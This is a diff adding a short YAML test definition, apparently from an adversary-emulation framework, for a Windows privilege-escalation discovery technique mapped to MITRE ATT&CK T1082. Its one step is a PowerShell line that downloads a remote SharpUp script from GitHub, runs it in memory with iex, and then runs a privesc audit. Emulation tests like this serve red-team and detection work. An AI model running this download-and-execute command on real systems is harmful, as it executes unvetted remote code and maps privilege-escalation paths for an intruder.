@@ -1,0 +1,21 @@
+api_version: "2.0"
+name: WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
+description: PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.
+uuid: efb79454-1101-4224-a4d0-30c9c8b29ffc
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1082: System Information Discovery'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---powersharppack---sharpup-checking-common-privesc-vectors
+      inline: |-
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
+        Invoke-SharpUp -command "audit"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
